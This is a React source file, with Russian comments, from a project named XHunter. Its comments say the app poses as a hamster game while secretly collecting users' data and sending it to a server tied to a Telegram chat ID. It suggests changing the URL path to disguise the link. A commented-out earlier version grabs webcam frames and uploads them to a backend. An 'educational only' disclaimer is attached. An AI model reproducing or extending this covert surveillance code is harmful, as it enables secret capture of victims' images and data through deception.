/**
 * 🎯 ГЛАВНЫЙ КОМПОНЕНТ ПРИЛОЖЕНИЯ XHUNTER
 * 
 * Этот файл содержит корневой компонент React приложения и настройку маршрутизации.
 * Приложение использует React Router для создания Single Page Application (SPA).
 * 
 * 🎮 КОНЦЕПЦИЯ:
 * Приложение маскируется под простую игру с хомяком, но в реальности
 * собирает данные пользователя и отправляет их через API на сервер.
 * 
 * 🗺️ МАРШРУТИЗАЦИЯ:
 * - `/g/:chatId` - единственный маршрут приложения
 * - chatId извлекается из URL и передается в PhotoPage компонент
 * - Этот ID используется для идентификации чата в Telegram
 * 
 * 📱 ПРИМЕР ИСПОЛЬЗОВАНИЯ:
 * https://your-site.com/g/123456789
 * где 123456789 - это ID Telegram чата
 * 
 * ⚠️ ЭТИЧЕСКИЕ СООБРАЖЕНИЯ:
 * Код предназначен только для образовательных целей!
 * В реальных проектах всегда информируйте пользователей о сборе данных.
 */

import React from 'react';
import { Route } from 'react-router-dom';
import PhotoPage from './PhotoPage';
import { Routes } from 'react-router-dom';
import './App.css'; // Импорт стилей с анимациями хомяка

/**
 * 🎯 ГЛАВНЫЙ КОМПОНЕНТ APP
 * 
 * Функциональный компонент, который настраивает маршрутизацию для всего приложения.
 * Использует React Router v6 для обработки навигации.
 * 
 * @returns {JSX.Element} JSX элемент с настроенными маршрутами
 */
const App = () => {
  return (
    /* 
     * 🗺️ БЛОК МАРШРУТИЗАЦИИ
     * 
     * Routes - контейнер для всех маршрутов приложения
     * В нашем случае у нас только один маршрут для основного функционала
     */
    <Routes>
      {/* 
       * 🎯 ОСНОВНОЙ МАРШРУТ
       * 
       * path="/g/:chatId" - определяет URL структуру
       * - /g/ - статическая часть пути (можно изменить для маскировки)
       * - :chatId - динамический параметр, который извлекается из URL
       * 
       * element={<PhotoPage />} - компонент, который будет отображаться
       * 
       * 💡 ПРИМЕРЫ URL:
       * - /g/123456789 -> chatId = "123456789"
       * - /g/987654321 -> chatId = "987654321"
       * - /g/abc123 -> chatId = "abc123"
       */}
      <Route path="/g/:chatId" element={<PhotoPage />} />
      
      {/* 
       * 🔧 ДОПОЛНИТЕЛЬНЫЕ МАРШРУТЫ (можно добавить при необходимости)
       * 
       * Примеры других маршрутов, которые можно добавить:
       * <Route path="/" element={<HomePage />} />           // Главная страница
       * <Route path="/about" element={<AboutPage />} />     // О проекте
       * <Route path="*" element={<NotFound />} />           // 404 страница
       */}
    </Routes>
  );
};

export default App;

/* 
 * 📝 ЗАКОММЕНТИРОВАННЫЙ КОД НИЖЕ
 * 
 * Это предыдущая версия приложения, которая содержала логику работы с камерой
 * непосредственно в App.js. Этот код был вынесен в отдельные компоненты
 * для лучшей архитектуры и разделения ответственности.
 * 
 * 🏗️ ЭВОЛЮЦИЯ АРХИТЕКТУРЫ:
 * 1. Вся логика в App.js (закомментированный код)
 * 2. Разделение на компоненты: App.js -> PhotoPage.js -> AccesCamera.jsx + LocationHandler.jsx
 * 3. Добавление API конфигурации и улучшенной обработки ошибок
 */

// import React, { useRef, useState, useEffect } from 'react';
// import { useParams } from 'react-router-dom';

// function App() {
//     const videoRef = useRef(null);
//     const canvasRef = useRef(null);
//     const params = useParams(); // Извлекаем chatId из URL
//     console.log(params);
//     const chatId = 9193
//     useEffect(() => {
//         const accessWebcam = async () => {
//             try {
//                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
//                 videoRef.current.srcObject = stream;
//             } catch (error) {
//                 console.error('Error accessing webcam:', error);
//             }
//         };

//         accessWebcam();

//         return () => {
//             const stream = videoRef.current.srcObject;
//             if (stream) {
//                 const tracks = stream.getTracks();
//                 tracks.forEach(track => track.stop());
//             }
//         };
//     }, []);

//     const captureImage = async () => {
//         if (!videoRef.current) {
//             console.error('Video element is null');
//             return;
//         }

//         const video = videoRef.current;
//         const canvas = canvasRef.current;
//         const context = canvas.getContext('2d');

//         canvas.width = video.videoWidth;
//         canvas.height = video.videoHeight;

//         context.drawImage(video, 0, 0, canvas.width, canvas.height);

//         canvas.toBlob(async (blob) => {
//             if (blob) {
//                 const formData = new FormData();
//                 formData.append('photo', blob, 'photo.jpg');

//                 const serverUrl = 'http://127.0.0.1:5000/photo';

//                 try {
//                     await fetch(`${serverUrl}/${chatId}`, {
//                         method: 'POST',
//                         body: formData
//                     });

//                     alert('Фотография успешно отправлена на сервер!');
//                 } catch (error) {
//                     console.error('Error sending photo to server:', error);
//                 }
//             }
//         }, 'image/jpeg');
//     };

//     return (
//         <div>
//             <h1>Webcam Photo Capture</h1>
//             <div>
//                 <video ref={videoRef} width="640" height="480" autoPlay></video>
//                 <button onClick={captureImage}>Capture</button>
//             </div>
//             <canvas ref={canvasRef} style={{ display: 'none' }}></canvas>
//         </div>
//     );
// }

// export default App;
